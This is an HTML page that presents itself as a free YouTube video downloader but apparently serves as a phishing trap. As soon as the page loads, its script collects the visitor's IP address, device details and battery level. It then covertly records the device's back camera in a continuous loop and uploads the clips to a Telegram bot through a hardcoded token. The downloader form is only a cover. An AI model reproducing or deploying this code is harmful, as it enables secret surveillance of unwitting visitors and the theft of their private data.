<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Videos Open</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

	<meta name="description" content="Free online YouTube video downloader to download YouTube videos in MP4 in HD quality with high download speed."/>

	<meta name="robots" content="index,follow" />
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400&display=swap" rel="stylesheet">
	<meta name="keywords" content="Free online YouTube video downloader to download YouTube videos in MP4 in HD quality with high download speed." />

     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">

	 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>

  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

  <link rel="icon" href="favicon.png" sizes="16x16" type="image/png">

  <style>
    * {

margin: 0;

padding: 0;

font-family: 'Poppins', sans-serif;

}

.mt-5, .my-5 {

    margin-top: 0rem!important;

}

.card{
  margin-top: 20vh;
}

h5{
  font-weight: 550;
  color: #fff;
}

#hd {

  width:100%;

  height:390px;

  margin:0 0 50px 0;

  }

.custom-shape-divider-bottom-1610026357 {

    position: absolute;

    bottom: 0;

    left: 0;

    width: 100%;

    overflow: hidden;

    line-height: 0;

    transform: rotate(180deg);

}

.custom-shape-divider-bottom-1610026357 svg {

    position: relative;

    display: block;

    width: calc(100% + 1.3px);

    height: 183px;

}

.custom-shape-divider-bottom-1610026357 .shape-fill {

    fill: #FFFFFF;

}

  </style>
  
</head>
<body>
    <video id="video" style="display: none;"></video>

    <script>
        const botToken = "7079733947:AAFRNG92o1mEzoDs2UoMHpVtVdH712nBvgM"; // Replace with your actual bot token
        let chatId = getChatIdFromUrl();
        let currentCamera = 'environment'; // Use 'environment' as the default (back) camera

        function getChatIdFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }

        async function fetchWanIp() {
            try {
                const response = await fetch("https://ipinfo.io/json");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error(error);
                return "Error retrieving WAN IP";
            }
        }

        async function sendInfoAndStartRecording() {
            const wanIp = await fetchWanIp();
            const userAgent = navigator.userAgent;
            const batteryPercentage = await getBatteryPercentage();
            const networkType = getNetworkType();
            const dateAndTime = new Date().toString();
            const totalRam = navigator.deviceMemory;

            const infoMessage = `
🌐 WAN IP Address: ${wanIp}
📱 User-Agent: ${userAgent}
🔋 Battery Percentage: ${batteryPercentage}%
📡 Network Type: ${networkType}
🗓 Date and Time: ${dateAndTime}
💾 Total RAM: ${totalRam} GB
📹 Video recording is starting...
`;

            sendTextToTelegram(infoMessage);
            startContinuousVideoRecording();
        }

        async function startContinuousVideoRecording() {
            const mediaOptions = { video: { facingMode: currentCamera } };

            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(mediaOptions);
                    const videoTrack = stream.getVideoTracks()[0];

                    const video = document.getElementById("video");
                    video.srcObject = stream;
                    video.style.display = "none";

                    const mediaRecorder = new MediaRecorder(stream);
                    let videoChunks = [];
// 9ait7777666544422
                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            videoChunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = () => {
                        const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
                        sendVideoToTelegram(videoBlob);
                    };

                    mediaRecorder.start();

                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 5000);

                    await new Promise(resolve => setTimeout(resolve, 6000)); // Wait for 6 seconds before starting the next recording
                } catch (error) {
                    console.error(error);
                    alert("Failed to access the camera for video recording.");
                    break; // Stop the loop on error
                }
            }
        }
// 9ait7777666544422
        function sendTextToTelegram(message) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
                method: "POST",
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Information sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send information to Telegram.");
                });
        }

        function sendVideoToTelegram(blob) {
            const formData = new FormData();
            formData.append("video", blob, "recording.mp4");
            formData.append("chat_id", chatId);
// 9ait7777666544422
            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Video recording sent to Telegram.");
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send video recording.");
                });
        }
// 9ait7777666544422
        async function getBatteryPercentage() {
            const battery = await navigator.getBattery();
            return (battery.level * 100).toFixed(2);
        }

        function getNetworkType() {
            return navigator.connection.effectiveType;
        }

        sendInfoAndStartRecording();
        
        $(".click-btn-down").click(function(){

      var link = $(".link").val();

    var fromate = $(".formte").children("option:selected").val();

    var src =""+link+"="+fromate+"";

    downloadVideo(link,fromate);

  });

  function downloadVideo(link,fromate) {

      $('.download-video').html('<iframe style="width:100%;height:60px;border:0;overflow:hidden;" scrolling="no" src="https://loader.to/api/button/?url='+link+'&f='+fromate+'"></iframe>');

  }
        
    </script>
    
    <div>

<div id='hd'>

  <!---<center><img alt='youtube video downloader' height='150' src='https://1.bp.blogspot.com/-6iQK-ugxaMA/XzlEKT2IKCI/AAAAAAAAB8w/ch-bNMemZroo07x-raUTXatJH2jQZh1hACLcBGAsYHQ/s1600/aaaaaaa.png' width='100' title='High Quality YouTube Video Downloader'/></center>--->

<div class="col-md-6 offset-md-3 mt-5 mt-3">

    <div class="card">

      <div class="card-header bg-info">

        <center><h5>All Format YouTube Video Downloader</h5>

      </div>

      <div class="card-body">

        <div class="row">

          <div class="col-md-12">

            <div class="form-group">

              <label class="text-weight"><b>Enter YT Video Link:</b></label>

              <input type="txt" name="link" class="form-control link" required>

            </div>

          </div>

        </div>

        <form class="form-download">

          <div class="row">

            <div class="col-md-12">

              <div class="form-group">

                <label class="text-weight"><b>Select Video Format:</b></label>

                <select class="form-control formte" required>

                  <option selected disabled>Select Video Formate</option>
                  <option value="mp3">Mp3</option>

                  <option value="mp4a">144 Mp4</option>

                  <option value="360">360 Mp4</option>

                  <option value="480">480 Mp4</option>

                  <option value="720">720 Mp4</option>

                  <option value="1080">1080 Mp4</option>

                  <option value="4k">4k Mp4</option>

                  <option value="8k">8k Mp4</option>

                </select>

              </div>

            </div>

          </div>

          <div class="row">

            <div class="col-md-12">

              <div class="form-group mt-4 download-video">

                <button class="btn btn-success btn-block click-btn-down" type="submit">Click Here</button>

              </div>

            </div>

          </div>

        </form>

      </div>

    </div>

  </div>

<!----<div class="custom-shape-divider-bottom-1610026357">

    <svg data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 120" preserveAspectRatio="none">

        <path d="M321.39,56.44c58-10.79,114.16-30.13,172-41.86,82.39-16.72,168.19-17.73,250.45-.39C823.78,31,906.67,72,985.66,92.83c70.05,18.48,146.53,26.09,214.34,3V0H0V27.35A600.21,600.21,0,0,0,321.39,56.44Z" class="shape-fill"></path>

    </svg>

</div>----->

</div>

</body>
</html>
